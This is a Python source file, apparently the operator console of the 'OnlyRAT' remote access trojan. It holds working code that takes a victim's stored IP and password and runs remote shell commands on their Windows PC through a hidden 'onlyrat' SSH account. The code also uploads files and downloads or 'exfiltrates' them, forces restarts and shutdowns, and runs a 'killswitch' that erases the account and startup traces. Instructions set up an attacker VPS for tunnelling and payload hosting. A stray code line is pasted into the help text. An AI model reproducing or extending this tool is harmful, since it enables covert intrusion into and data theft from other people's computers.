#!/usr/bin/python
# python console for OnlyRAT
# created by : C0SM0

# imports
import os
import sys
import getpass
from datetime import datetime

# banner for display
banner = """
                                                                     _;,
                                                 ,,=-,--,,__     _,-;:;;},,,_    
            _,oo,         Ll                 _,##&&&&$$&&$$$&-=;%%^%&;v:&& @ `=,_   
          ,oO" `0}        Ll              ,%#####&#>&&$$$$&$$$&,&'$$#`"%%;,,,*%^<}  
      _,--O;_,  0_        Ll            ,%%%%%&%-#&###$$"$$$$$*;&&$,#;%^*%$$^{,%;'
   ,cC'oO`'CC  ,OnnNNNNn, Ll  YY,      ,%#&%%$$$$%%%%%##&&^$%^%&&&$$'&#,-%%--"'
  ,CCCO"   `C ,0`Nn`  `Nn Ll   YY,    ,;;##&,$$$$$$$;,%%%&&%%%&&&&&&$$%%'
  {CC{       ,0' NN    NN Ll    Yy  yY';#&,#,$$$$$%%%%%%%%&%%%&&&&&&%%`
  CCC(     _o0   NN    NN Ll     YyyY ,;&##&###%%$$%&&%%%%#^%^&&&&&%{`
 ,OCC{    ,0C    NN    NN Ll      YY   ;#&&#####&%;%&&,%%%%#%=%%%&^%%               
,O`'"Cc_.o0cC    NN    NN Ll y,   YY   ;&&&^##&&&$%&&&%%%"`     `%%%%               
o0    _o0"` '`   NN    NN Ll  Yy,yYY  '^%%&VGh%%%%%&&"^%_,,       "%%%,_      _,.,_  
0o,_,oo0"        NN    NN Ll   `YyY`    ``'"lIG9ubHkg,,""''`        ""%%>_,;VyIG5lZ;,   
"00O"`                                          ``'``""UkFUIHlvdSdsbCBldm;"       `"WQ=,

                 [::] The Only RAT You'll Ever Need [::]
                    [::] Created By : Blue Cosmo [::]
"""

# help menu
help_menu = """
        [+] Arguments:
            <username>.rat ------------ Access Target Via Config File
            -d, --dfig <vps_user> ----- Download RAT Config File 
            -s, --setup --------------- Setup VPS
            -m, --man ----------------- OnlyRAT Manual
            -v, --version ------------- OnlyRAT Version
            -u, --update -------------- Update OnlyRAT
import random as r
            -r, --remove -------------- Uninstall OnlyRAT
            -h, --help  --------------- Help Menu

        [+] Example:
            onlyrat bluecosmo.rat
"""

# option menu
options_menu = """
        [+] Command and Control:
            [orconsole] -------------- Remote Console
            [fix orconsole] ---------- Fix Remote Console
            [upload] ----------------- Upload Files to Target PC
            [download] --------------- Download Files from Target PC
            [set connection local] --- Sets Connection to Local
            [set connection remote] -- Sets Connection to Remote
            [restart] ---------------- Restart Target PC
            [shutdown] --------------- Shutdown Target PC
            [killswitch] ------------- Removes OnlyRAT From Target

        [+] Payloads:
            Coming Soon...

        [+] Options:
            [help] ------------------- Help Menu
            [man] -------------------- Onlyrat Manual
            [config] ----------------- Display RAT File
            [version] ---------------- Version Number
            [update] ----------------- Update OnlyRAT
            [uninstall] -------------- Uninstall OnlyRAT
            [quit] ------------------- Quit

            * any other commands will be 
              sent through your terminal

        [*] Select an [option]...
"""

username = getpass.getuser() # gets username
header = f"[~] {username}@onlyrat $ " # sets up user input interface
remote_path = "raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main" # url path for OnlyRAT files
local_path = f"/home/{username}/.OnlyRAT" if username != "root" else "/root/.OnlyRAT" # gets path of OnlyRAT

# read config file
def read_config(config_file):
    configuration = {}

    # get file contents
    read_lines = open(config_file, "r").readlines()

    # get target configurations
    configuration["IPADDRESS"] = read_lines[0].strip()
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["WORKINGDIRECTORY"] = (read_lines[2]).replace("\\", "/").strip()
    configuration["STARTUPDIRECTORY"] = (read_lines[3]).replace("\\", "/").strip()
    configuration["REMOTEHOST"] = read_lines[4].strip()
    configuration["PORT"] = read_lines[5].strip()
    configuration["CONNECT"] = read_lines[6].strip()

    return configuration

# display configuration file data
def print_config(configuration):

    for key, value in configuration.items():
        print(f"{key} : {value}")

# clear screen
def clear():
    os.system("clear")

# terminates program
def exit():
    print("\n[*] Exiting...")
    sys.exit()

# gets current date and time
def current_date():
    current = datetime.now()    

    return current.strftime("%m-%d-%Y_%H-%M-%S")

# edit connection type
def edit_connection(rat_file, connection):

    # get current configuration
    lines = open(rat_file, "r").readlines()

    # add new connection type
    lines[6] = connection

    # rewrite configuration file
    with open(rat_file, "w") as rat:
        for line in lines:
            rat.write(line)

# connects rat to target
def connect(address, password, port):
    print("\n [*] Connecting to target...")

    os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address} -p {port}")

# remote uploads with SCP
def remote_upload(address, password, upload, path, port):

    print("\n[*] Starting Upload...")

    # scp upload
    os.system(f"sshpass -p \"{password}\" scp -P {port} -r {upload} onlyrat@{address}:{path}")

    print("[+] Upload complete\n")

# remote download with SCP
def remote_download(address, password, path, port):

    print("\n[*] Starting Download...")

    # scp download
    os.system("mkdir ~/Downloads")

    os.system(f"sshpass -p \"{password}\" scp -P {port} onlyrat@{address}:{path} ~/Downloads")

    print("[+] Download saved to \"~/Downloads\"\n")

# run commands remotely with SCP
def remote_command(address, password, command, port):

    os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address} -p {port} '{command}'")

# killswitch
def killswitch(address, password, working, username, port):
    print("\n[*] Prepping killswitch...")
    # web requests
    killswitch_command = f"powershell /c Remove-Item {working}/* -r -Force; Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item \"C:/Users/onlyrat\" -r -Force; Remove-LocalUser -Name \"onlyrat\"; shutdown /r"
    print("[+] Killswitch prepped")

    # installing killswitch
    print("[*] Executing killswitch...")
    remote_command(address, password, f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && del *.cmd", port)
    remote_command(address, password, killswitch_command, port)
    print("[+] Killswitch Executed sucessfully\n")
       
    # execute logger
    print("\n[*] Restarting target computer...")

# custom upload
def upload(address, password, working, port):

    # get upload file
    print("\n[~] Enter file you wish to upload :")
    upload_file = input(header)

    # upload file
    print("\n[*] Uploading...")
    remote_upload(address, password, upload_file, working, port)
    print(f"[+] Uploaded sucessfully to \"{working}\"\n")

# custom download
def download(address, password, port):

    # get download path
    print("\n[~] Enter path of file you wish to download :")
    download_file = input(header)

    # download file
    print("\n[*] Downloading...")
    remote_download(address, password, download_file, port)

# update OnlyRAT
def update():

    print("\n[*] Checking for updates...")

    # get latest version nubmer
    os.system("curl https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/version.txt | tee ~/.OnlyRAT/latest.txt")

    # save version nubmers to memory
    current_version = float(open(f"{local_path}/version.txt", "r").read())
    latest_version = float(open(f"{local_path}/latest.txt", "r").read())

    # remove version number file
    os.system("rm -rf ~/.OnlyRAT/latest.txt")

    # if new version is available, update
    if latest_version > current_version:
        print("\n[+] Update found")
        print("[~] Update Onlyrat? [y/n]\n")

        # user input, option
        option = input(f"{header}")

        # update
        if option == "y":
            os.system("bash ~/.OnlyRAT/payloads/update.sh")

        # exception
        # else:
        #     main()

    # otherwise, run main code
    else:
        print("\n[+] OnlyRAT already up to date")
        print("[*] Hit any key to continue...\n")
        input(header)
        #main()

# uninstalls onlyrat
def remove():
    # confirmation
    print("\n[~] Are you sure you want to remove OnlyRAT [y/n]\n")

    # user input
    option = input(header)

    # delete OnlyRAT
    if option == "y":
        os.system("rm -rf ~/.OnlyRAT")

    # cancel
    if option == "n":
        main()

# download configuration file
def download_config():

    # user input, address
    print("[~] What is the VPS User? : ")
    user = input(header)
    print()

    # user input, address
    print("[~] What is the VPS IP Address? : ")
    address = input(header)
    print()

    # user input, address
    print("[~] What is the VPS Port? : ")
    port = input(header)
    print()


    # format vps
    vps = f"{user}@{address}"

    # confirm values
    print("[~] Is The Following Correct? : [y/n]")
    print(vps)
    confirm = input(header)
    print()

    # if yes
    if confirm == "y" or confirm == "yes":
        print("[*] Downloading configuration...")
        os.system(f"scp -P {port} {vps}:/home/{user}/*.rat .")
    
    # if no
    elif confirm == "n" or confirm == "no":
        download_config()
        
    # exception
    else:
        print("[!!] Value Not Recognized")

# setup vps
def setup_vps():
    # user input, address
    print("[~] What is the VPS User? : ")
    user = input(header)
    print()

    # user input, address
    print("[~] What is the VPS IP Address? : ")
    address = input(header)
    print()

    # user input, port
    print("[~] What is the VPS Port? : ")
    port = input(header)
    print()

    # format vps
    vps = f"{user}@{address}"

    # confirm values
    print("[~] Is The Following Correct? : [y/n]")
    print(f"{vps} -p {port}")
    confirm = input(header)
    print()

    # if yes
    if confirm == "y" or confirm == "yes":

            # ssh vps settings
            print("""
            [!] READ ALL INSTRUCTIONS CAREFULLY

            [+] Setting up VPS
            
            [1] set up the VPS and edit the ssh file

                nano /etc/ssh/sshd_config 
            
            [2] change the following, remove "#"

                AllowTcpForwarding yes
                GatewayPorts yes 

            [3] save changes and restart ssh

                sudo service ssh restart

            [*] Creating Our SSH Key...
                - set filename as "key"
                - set NO PASSWORD
            """)

            # creating ssh key
            os.system("ssh-keygen")
            os.system("chmod 600 key")
            os.system(f"ssh-copy-id -i key -p {port} {vps}")

            # confirmation
            print(f"""
            [+] The Key Has Been Generated

            [*] To Test It, You Can Run:
                ssh {vps} -i key
            
            [*] Uploading SSH Key to VPS...
            """)

            # upload ssh key to vps
            os.system(f"scp -P {port} -r key {vps}:/home/{user}")

            # final vps settings
            print("""
            [+] The Key Has Been Uploaded
                - You may need to move the key to '/var/www/html' 
                if you plan to use apache2 for your webserver

            [4] Make Your Key Readable
                
                chmod +r key

            [5] Add OnlyRAT to Web Server

                git clone https://github.com/cosmodiumcs/onlyrat.git

            [6] On Line 2 of '/installers/from-vps.cmd', 
                Add Your VPS IP Address

            [7] On Line 2 of '/payloads/v1.cmd', 
                Add Your VPS IP Address 

            [8] On Lines 3-5 of '/payloads/v2.ps1', 
                Fill in The Appropiate Values 

            [9] Start Web Server

                python3 -http.server 80
                # or
                sudo service start apache2

            [+] Congrats! You are all set up!
            """)

    # if no
    elif confirm == "n" or confirm == "no":
        setup_vps()
        
    # exception
    else:
        print("[!!] Value Not Recognized")

# command line interface
def cli(arguments):
    # display banner
    clear()

    print(banner)

    # if arguments exist
    if arguments:

        argument = sys.argv[1]

        if argument.endswith(".rat"):
            print("\t[~] Type \"help\" for help menu :\n")

            # loop user input
            while True:

                # user input, option
                option = input(header)
                rat_file = argument

                # check if configuration file exists
                try:
                    configuration = read_config(rat_file)
            
                except FileNotFoundError: 
                    print("\n[!!] File does not exist")
                    exit()

                # get config info
                local_host = configuration.get("IPADDRESS")
                password = configuration.get("PASSWORD")
                working_direcory = configuration.get("WORKINGDIRECTORY")
                startup_direcory = configuration.get("STARTUPDIRECTORY")
                remote_host = configuration.get("REMOTEHOST")
                remote_port = configuration.get("PORT")
                connection_type = configuration.get("CONNECT")
                target_username = working_direcory[9:-19]

                # get current connection type
                ipv4 = remote_host if connection_type == "remote" else local_host
                port = remote_port if connection_type == "remote" else "22"
                
                # remote console
                if option == "orconsole":
                    connect(ipv4, password, port)

                # fix remote console
                elif option == "fix orconsole":
                    os.system(f"sh {local_path}/payloads/fix-orconsole.sh {local_path} {ipv4} {password} {port}")

                # set remote connection
                elif option == "set connection local":
                    edit_connection(rat_file, "local")

                # set local connection
                elif option == "set connection remote":
                    edit_connection(rat_file, "remote")

                # custom upload
                elif option == "upload":
                    upload(ipv4, password, working_direcory, port)

                # custom download
                elif option == "download" or option == "exfiltrate":
                    download(ipv4, password, port)

                # restart target option
                elif option == "restart":
                    remote_command(ipv4, password, "shutdown /r", port)
                    
                # shutdown target option
                elif option == "shutdown":
                    remote_command(ipv4, password, "shutdown", port)

                # help menu
                elif option == "help":
                    print(banner)
                    print(options_menu)

                # display config file info
                elif option == "config":
                    print_config(configuration)
                    print(f"USERNAME : {target_username}")
                
                # get version number
                elif option == "version":
                    os.system(f"cat {local_path}/version.txt")

                # update option
                elif option == "update":
                    update()
                    exit()

                # kill switch
                elif option == "killswitch":
                    print("\n[~] Are you sure you want to remove OnlyRAT from your target [y/n")
                    confirm = input(header)
                    if confirm == "y":
                        killswitch(ipv4, password, working_direcory, target_username, port)

                    else:
                        main()

                # onlyrat manual
                elif option == "man" or option == "manual":
                    os.system(f"xdg-open https://github.com/CosmodiumCS/OnlyRAT/blob/main/payloads/manual.md")

                # remove installation
                elif option == "remove" or option == "uninstall":
                    remove()

                # quit option
                elif option == "quit" or option == "exit":
                    exit()

                # exception
                else:
                    os.system(option)
                
                # new line for cleaner UI
                print("\n")

        # download configuration file argument
        elif argument == "--dfig" or argument == "-d" or argument == "--download":
            download_config()

        # setup vps argument
        elif argument == "--setup" or argument == "-s":
            setup_vps()

        # onlyrat manual argument
        elif argument == "--manual" or argument == "-m" or argument == "--man":
            os.system(f"xdg-open https://github.com/CosmodiumCS/OnlyRAT/blob/main/payloads/manual.md")

        # onlyrat version argument
        elif argument == "--version" or argument == "-v":
            os.system(f"cat {local_path}/version.txt")

        # update onlyrat argument
        elif argument == "--update" or argument == "-u":
            update()
            exit()
            
        # remove onlyrat argument
        elif argument == "--remove" or argument == "-r" or argument == "--uninstall": 
            remove()

        # help menu argument
        elif argument == "--help" or argument == "-h":
            print(help_menu)

        # exception
        else:
            print("[!!] Argument Not Recognized")

    # if arguments don't exist
    else:
        print(help_menu)

# main code
def main():
    
    # clear screen
    clear()

    # checks for arguments
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    else:
        arguments_exist = True

    # run command line interface
    cli(arguments_exist)

# runs main code
if __name__ == "__main__":
    # runs main function
    main()
